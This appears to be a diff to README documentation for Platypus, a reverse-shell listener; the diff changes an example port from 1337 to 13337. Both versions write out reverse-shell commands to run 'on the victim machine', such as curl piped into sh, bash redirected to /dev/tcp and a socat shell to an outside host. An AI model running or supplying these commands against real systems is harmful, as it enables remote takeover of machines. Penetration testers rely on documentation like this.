@@ -2,7 +2,7 @@
 
 > NOTICE: ONLY WORKS on *NIX
 
-Platypus is able to multiplex the reverse shell listening port. Port `1337 / 1338` can handle reverse shell client connections.  
+Platypus is able to multiplex the reverse shell listening port. Port `13337 / 1338` can handle reverse shell client connections.  
 Also, There is another interesting feature that platypus provides, which is called `Reverse Shell as a Service (RaaS)`.
 
 Assume that you have got an arbitrary RCE on the target application, but the target application will strip the non-alphabet letter like `&`, `>`. then this feature will be useful.
@@ -17,30 +17,30 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.174.132:8080
 
 To archive your aim, all you need is to construct a URL that indicates the target.
 
-The command `bash -c "bash -i >/dev/tcp/5.6.7.8/1337 0>&1"` is the equivalent of `curl http://1.2.3.4:1337/5.6.7.8/1337 | sh`, this feature provides the capability to redirect a new reverse shell to another IP and port without remembering the boring reverse shell command.
+The command `bash -c "bash -i >/dev/tcp/5.6.7.8/13337 0>&1"` is the equivalent of `curl http://1.2.3.4:13337/5.6.7.8/13337 | sh`, this feature provides the capability to redirect a new reverse shell to another IP and port without remembering the boring reverse shell command.
 
-If you just want to pop up a reverse shell to the listening port of platypus, the parameter (`1.2.3.4/1337`) can be omitted.
+If you just want to pop up a reverse shell to the listening port of platypus, the parameter (`1.2.3.4/13337`) can be omitted.
 
-Once the command gets executed, the reverse shell session will appear in platypus which is listening on `1.2.3.4:1337`.
+Once the command gets executed, the reverse shell session will appear in platypus which is listening on `1.2.3.4:13337`.
 
 ## Quick start
 
-1. Start platypus and listen to any port (eg: 1.2.3.4 1337)
-2. Execute `curl http://1.2.3.4:1337 | sh` on the victim machine
+1. Start platypus and listen to any port (eg: 1.2.3.4 13337)
+2. Execute `curl http://1.2.3.4:13337 | sh` on the victim machine
 
 ## Specifying language of reverse shell command (default: bash)
 
 Also, you can specify the specific language of creating a reverse shell. All available languages are listed at [templates](https://github.com/WangYihang/Platypus/tree/master/lib/runtime/template/rsh)
 
-1. Start platypus and listen to any port (eg: 1.2.3.4 1337)
-2. Execute `curl http://1.2.3.4:1337/python | sh` on the victim machine
+1. Start platypus and listen to any port (eg: 1.2.3.4 13337)
+2. Execute `curl http://1.2.3.4:13337/python | sh` on the victim machine
 
 ## What if I want to pop up the reverse shell to another IP (5.6.7.8) and port (7331)?
 
 By default, the new reverse shell will be popped up to the server which the port which the HTTP request sent, but you can simply change the IP and port by following these steps:
 
-1. Start platypus and listen to any port (eg: 1.2.3.4 1337)
-2. Execute `curl http://1.2.3.4:1337/5.6.7.8/7331/python | sh` on the victim machine
+1. Start platypus and listen to any port (eg: 1.2.3.4 13337)
+2. Execute `curl http://1.2.3.4:13337/5.6.7.8/7331/python | sh` on the victim machine
 
 ## How to add a new language
 
